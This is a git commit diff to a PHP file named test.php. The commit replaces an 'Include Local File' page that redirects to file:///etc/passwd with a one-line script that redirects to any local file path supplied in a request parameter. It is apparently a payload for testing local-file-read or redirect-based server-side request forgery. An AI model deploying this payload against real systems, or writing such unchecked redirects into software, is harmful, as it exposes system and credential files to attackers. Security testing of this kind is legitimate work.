a218b62237baa3733bf618b5a8936bcea566c1ff
Nassim Nedjar <56744073+nednassim@users.noreply.github.com>
2024-07-25 01:59:20 +0100

    Update test.php

--- test.php
+++ test.php
@@ -1,9 +1,2 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Include Local File</title>
-    <?php header('location:file:///etc/passwd'); ?>
-</head>
-<body>
+<?php header('location:file://'.$_REQUEST['x']); ?>
 
